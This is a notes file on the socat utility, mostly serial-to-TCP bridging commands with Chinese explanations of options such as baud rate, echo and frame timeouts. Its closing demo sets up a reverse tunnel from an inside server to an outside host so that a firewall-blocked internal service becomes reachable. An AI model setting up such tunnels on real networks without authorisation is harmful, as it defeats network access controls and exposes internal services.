socat tcp-listen:9600,reuseaddr,fork file:/dev/ttyUSB0,nonblock,raw,echo=0,waitlock=/var/run/tty1,b9600 & 
#open a tcp 115200 port & set to baud rate 115200. The usb serial port is /dev/ttyUSB0 
socat tcp-listen:115200,reuseaddr,fork file:/dev/ttyUSB0,nonblock,raw,echo=0,waitlock=/var/run/tty2,b115200 &


socat -d -d  file:/dev/ttyUSB0, tcp:192.168.1.114:1027
socat -x -d -d -d -d tcp:192.168.1.114:1031 file:/dev/ttyS1,b9600,echo=0,raw,nonblock,vmin=10,vtime=255
解释
    -x 以16进制显示发送和接收的内容.
    -d 0~4个调试等级,输出调试信息.
    端口1(以太网)参数:
        tcp:tcp服务
        192.168.1.114 IP
        1031 端口
    端口2(串口)参数:
        file 类型,文件(设备文件)
        /dev/ttyS1 串口设备文件
        b9600 波特率
        echo=0 关闭回显
        raw 原始格式,不转义\r\n
        nonblock 不阻塞
        串口超时属性,两者或关系.接收大于255字节或者字节间超过1秒没数据就是一帧.
            vmin=10 10*100ms没有数据则超时结束,认为是一帧.
            vtime=255 串口接收大于255个字节则认为是一帧.
            
            
tcp server 模式
socat -d -d  file:/dev/ttyUSB0,nonblock,raw,crnl tcp-l:2000,reuseaddr,fork
socat -x -d -d -d -d tcp-l:2000,reuseaddr,fork file:/dev/ttyS1,b9600,echo=0,raw,nonblock,vmin=10,vtime=255
    -x (和上面一样)
    -d (和上面一样)
    端口1(以太网)参数:
        tcp-l tcp listen监听,即作为服务器
        2000 监听绑定的端口
        reuseaddr 重使用ip地址
        fork 创建新的进程用于接收客户端连接
    端口2(串口)参数:(和上面一样)
}

option(PTY){
PTY option group

}

option(OPENSSL){
OPENSSL option group

}

option(RETRY){
RETRY option group
  interval=<timespec> # 连续重试之间的时间间隔(second)
  retry=<num>         # 进行指定次数重试，0意味着只试一次
  forever             # 进行无限次重试
}

option(TUN){
TUN option group
}

demo(){
Hosts: 
    a server, blocked by a firewall 
    a client outside the firewall ("outside-host") 
    a firewall that allows arbitrary TCP connections from server to outside, port 80
1) Start the double client on the inside server
// every 10 seconds, it tries to establish a connection to the outside host. 
// whenever it succeeds, it forks a sub process that connect to the internal 
// service and starts to transfer data 
$ socat -d -d -d -t5 tcp:outside-host:80,forever,intervall=10,fork tcp:localhost:80
2) Start double server on the outside client 
// wait for a connection from a local client. whenever it accepted it, forks 
// a subprocess that tries to bind to the socket where the inside double 
// client tries to connect (might need to wait for a previous process to 
// release the port) 
# socat -d -d -d tcp-l:80,reuseaddr,bind=127.0.0.1,fork tcp-l:80,bind=outside-host,reuseaddr,retry=10 3) Connect with outside client $ mozilla http://127.0.0.1/

}